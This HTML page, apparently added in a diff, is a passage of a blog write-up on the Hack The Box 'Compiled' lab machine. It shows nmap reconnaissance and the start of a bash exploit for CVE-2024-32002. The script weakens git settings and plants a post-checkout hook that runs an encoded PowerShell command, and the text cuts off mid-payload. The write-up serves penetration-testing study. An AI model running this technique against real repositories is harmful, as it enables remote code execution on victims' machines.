@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/12/13/hackthebox-compiled/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewCompiled is a medium-difficulty machine from Hack The Box . It’s pretty straight forward as it deals directly with 2 CVEs from the year 2024 in order to pwn it. Initially we’ll deal with CVE-2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Compiled">
+<meta property="og:url" content="http://foued-saidi.tech/2024/12/13/Hackthebox-Compiled/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewCompiled is a medium-difficulty machine from Hack The Box . It’s pretty straight forward as it deals directly with 2 CVEs from the year 2024 in order to pwn it. Initially we’ll deal with CVE-2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Compiled/Compiled.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Compiled/web5000.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Compiled/web3000.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Compiled/cve32.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Compiled/cve2.png">
+<meta property="article:published_time" content="2024-12-13T14:33:35.000Z">
+<meta property="article:modified_time" content="2024-12-13T17:21:03.843Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Compiled/Compiled.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Compiled -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Compiled</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-13 15:33:35</span>
+        <span class="mobile">2024-12-13 15:33:35</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-12-13 18:21:03</span>
+            <span class="mobile">2024-12-13 18:21:03</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Compiled is a medium-difficulty machine from Hack The Box . It’s pretty straight forward as it deals directly with 2 CVEs from the year 2024 in order to pwn it. Initially we’ll deal with CVE-2024-32002 which is a git-rce exploit allowing you to abuse git clone to expose .git&#x2F; directory to git’s execution context. Later exploiting CVE-2024-20656 which will abuse VSCode’s VSStandardCollectorService150 service -setup by default as NT AUTHORITY\SYSTEM- to get our privileged shell. Hope you enjoy it!<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Compiled/Compiled.png"
+                      alt="Compiled-info-card"
+                ><figcaption>Compiled-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">253.115</span> </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-12-13</span> <span class="number">15</span>:<span class="number">40</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">253.115</span></span><br><span class="line">Host is up (<span class="number">1.6</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">3000</span>/tcp open  http    Golang net/http server</span><br><span class="line">| fingerprint<span class="literal">-strings</span>:</span><br><span class="line">|   GenericLines, Help, RTSPRequest:</span><br><span class="line">|     HTTP/<span class="number">1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line">|     Content<span class="literal">-Type</span>: text/plain; charset=utf<span class="literal">-8</span></span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/<span class="number">1.0</span> <span class="number">200</span> OK</span><br><span class="line">|     Cache<span class="literal">-Control</span>: max<span class="literal">-age</span>=<span class="number">0</span>, private, must<span class="literal">-revalidate</span>, no<span class="literal">-transform</span></span><br><span class="line">|     Content<span class="literal">-Type</span>: text/html; charset=utf<span class="literal">-8</span></span><br><span class="line">|     <span class="built_in">Set-Cookie</span>: i_like_gitea=f629d85303be2590; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     <span class="built_in">Set-Cookie</span>: _csrf=<span class="number">3</span><span class="built_in">H</span><span class="literal">-4uwqM0T21f96Y2AnD3O-Vdco6MTczNDEwMTM3NDY0NDIzNzMwMA</span>; Path=/; Max<span class="literal">-Age</span>=<span class="number">86400</span>; HttpOnly; SameSite=Lax</span><br><span class="line">|     X<span class="literal">-Frame-Options</span>: SAMEORIGIN</span><br><span class="line">|     Date: Fri, <span class="number">13</span> Dec <span class="number">2024</span> <span class="number">14</span>:<span class="number">49</span>:<span class="number">34</span> GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;en-US&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">theme</span>-<span class="title">arc</span>-<span class="title">green</span>&quot;&gt;</span></span><br><span class="line"><span class="class">|     &lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="class">|     &lt;<span class="title">meta</span> <span class="title">name</span>=&quot;<span class="title">viewport</span>&quot; <span class="title">content</span>=&quot;<span class="title">width</span>=<span class="title">device</span>-<span class="title">width</span>, <span class="title">initial</span>-<span class="title">scale</span>=1&quot;&gt;</span></span><br><span class="line"><span class="class">|     &lt;<span class="title">title</span>&gt;<span class="title">Git</span>&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="class">|     &lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">manifest</span>&quot; <span class="title">href</span>=&quot;<span class="title">data</span>:<span class="title">application</span>/<span class="title">json</span>;<span class="title">base64</span>,<span class="title">eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA</span></span></span><br><span class="line"><span class="class">|   <span class="title">HTTPOptions</span>:</span></span><br><span class="line"><span class="class">|     <span class="title">HTTP</span>/1.0 405 <span class="title">Method</span> <span class="title">Not</span> <span class="title">Allowed</span></span></span><br><span class="line"><span class="class">|     <span class="title">Allow</span>: <span class="title">HEAD</span></span></span><br><span class="line"><span class="class">|     <span class="title">Allow</span>: <span class="title">HEAD</span></span></span><br><span class="line"><span class="class">|     <span class="title">Allow</span>: <span class="title">GET</span></span></span><br><span class="line"><span class="class">|     <span class="title">Cache</span>-<span class="title">Control</span>: <span class="title">max</span>-<span class="title">age</span>=0, <span class="title">private</span>, <span class="title">must</span>-<span class="title">revalidate</span>, <span class="title">no</span>-<span class="title">transform</span></span></span><br><span class="line"><span class="class">|     <span class="title">Set</span>-<span class="title">Cookie</span>: <span class="title">i_like_gitea</span>=1<span class="title">f26abc6f135dbd0</span>; <span class="title">Path</span>=/; <span class="title">HttpOnly</span>; <span class="title">SameSite</span>=<span class="title">Lax</span></span></span><br><span class="line"><span class="class">|     <span class="title">Set</span>-<span class="title">Cookie</span>: _<span class="title">csrf</span>=<span class="title">OvRjhGVT_QhYWSN</span>-<span class="title">YXNnKLl5mBI6MTczNDEwMTM3ODc0MjY0ODgwMA</span>; <span class="title">Path</span>=/; <span class="title">Max</span>-<span class="title">Age</span>=86400; <span class="title">HttpOnly</span>; <span class="title">SameSite</span>=<span class="title">Lax</span></span></span><br><span class="line"><span class="class">|     <span class="title">X</span>-<span class="title">Frame</span>-<span class="title">Options</span>: <span class="title">SAMEORIGIN</span></span></span><br><span class="line"><span class="class">|     <span class="title">Date</span>: <span class="title">Fri</span>, 13 <span class="title">Dec</span> 2024 14:49:38 <span class="title">GMT</span></span></span><br><span class="line"><span class="class">|_    <span class="title">Content</span>-<span class="title">Length</span>: 0</span></span><br><span class="line"><span class="class">|_<span class="title">http</span>-<span class="title">title</span>: <span class="title">Git</span></span></span><br><span class="line"><span class="class">5000/<span class="title">tcp</span> <span class="title">open</span>  <span class="title">http</span>    <span class="title">Werkzeug</span> <span class="title">httpd</span> 3.0.3 (<span class="title">Python</span> 3.12.3)</span></span><br><span class="line"><span class="class">|_<span class="title">http</span>-<span class="title">server</span>-<span class="title">header</span>: <span class="title">Werkzeug</span>/3.0.3 <span class="title">Python</span>/3.12.3</span></span><br><span class="line"><span class="class">|_<span class="title">http</span>-<span class="title">title</span>: <span class="title">Compiled</span> - <span class="title">Code</span> <span class="title">Compiling</span> <span class="title">Services</span></span></span><br><span class="line"><span class="class">1 <span class="title">service</span> <span class="title">unrecognized</span> <span class="title">despite</span> <span class="title">returning</span> <span class="title">data</span>. <span class="title">If</span> <span class="title">you</span> <span class="title">know</span> <span class="title">the</span> <span class="title">service</span>/<span class="title">version</span>, <span class="title">please</span> <span class="title">submit</span> <span class="title">the</span> <span class="title">following</span> <span class="title">fingerprint</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap</span>.<span class="title">org</span>/<span class="title">cgi</span>-<span class="title">bin</span>/<span class="title">submit</span>.<span class="title">cgi</span>?<span class="title">new</span>-<span class="title">service</span> :</span></span><br><span class="line"><span class="class"><span class="title">SF</span>-<span class="title">Port3000</span>-<span class="title">TCP</span>:<span class="title">V</span>=7.95%<span class="title">I</span>=7%<span class="title">D</span>=12/13%<span class="title">Time</span>=675<span class="title">C4815</span>%<span class="title">P</span>=<span class="title">i686</span>-<span class="title">pc</span>-<span class="title">windows</span>-<span class="title">windows</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">snip</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">Service</span> <span class="title">detection</span> <span class="title">performed</span>. <span class="title">Please</span> <span class="title">report</span> <span class="title">any</span> <span class="title">incorrect</span> <span class="title">results</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap</span>.<span class="title">org</span>/<span class="title">submit</span>/ .</span></span><br><span class="line"><span class="class"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 263.07 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have ports 22 (ssh), 5000 (http) and 3000(http) open. Port 3000 seems like the backend since it’s running on golang and port 5000 seems like the frontend since its running python’s werkzeug.<br>Let’s discover!</p>
+<h3 id="Web-Application-http-10-129-253-115-5000"><a href="#Web-Application-http-10-129-253-115-5000" class="headerlink" title="Web Application - http://10.129.253.115:5000"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://10.129.253.115:5000/" >http://10.129.253.115:5000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Compiled/web5000.png"
+                      alt="Web App - Port 5000"
+                ><figcaption>Web App - Port 5000</figcaption></figure></p>
+<p>We can see that we could enter a specific Git repo URL and it will get compiled by the application. Sus, right?!<br>When I first pwned the machine I spent a lot of time on this feature. However I got nowhere.</p>
+<h3 id="Web-Application-http-10-129-253-115-3000"><a href="#Web-Application-http-10-129-253-115-3000" class="headerlink" title="Web Application - http://10.129.253.115:3000"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://10.129.253.115:3000/" >http://10.129.253.115:3000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>Navigating to the Gitea interface on port 3000, we found a couple of interesting repos after registering for an account:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Compiled/web3000.png"
+                      alt="Web App - Port 3000"
+                ><figcaption>Web App - Port 3000</figcaption></figure></p>
+<h3 id="CVE-2024-32002-Richard"><a href="#CVE-2024-32002-Richard" class="headerlink" title="CVE-2024-32002 - Richard"></a>CVE-2024-32002 - Richard</h3><p>Taking a closer look at the <code>Calculator</code> repository, we can see this interesting info:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Compiled/cve32.png"
+                      alt="CVE-2024-32002"
+                ><figcaption>CVE-2024-32002</figcaption></figure></p>
+<p>Doing some ninja lookup on the mighty google, I stumbled into <a class="link"   target="_blank" rel="noopener" href="https://amalmurali.me/posts/git-rce/" >this amazing explanation and overview of CVE-2024-32002 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> alongside <a class="link"   target="_blank" rel="noopener" href="https://github.com/safebuffer/CVE-2024-32002/blob/main/poc.sh" >this amazing poc on Github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<p>LESSGERIT!</p>
+<p>Having these two amazing resources, I just created a simple bash script that’s adequate to my needs:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">git config --global protocol.file.allow always</span><br><span class="line">git config --global core.symlinks <span class="literal">true</span></span><br><span class="line">git config --global init.defaultBranch main</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf repo1</span><br><span class="line"><span class="built_in">rm</span> -rf repo2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> http://gitea.compiled.htb:3000/kujen/repo1.git</span><br><span class="line"><span class="built_in">cd</span> repo1</span><br><span class="line"><span class="built_in">mkdir</span> -p y/hooks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; y/hooks/post-checkout &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">#!bin/sh.exe</span></span><br><span class="line"><span class="string">powershell -e 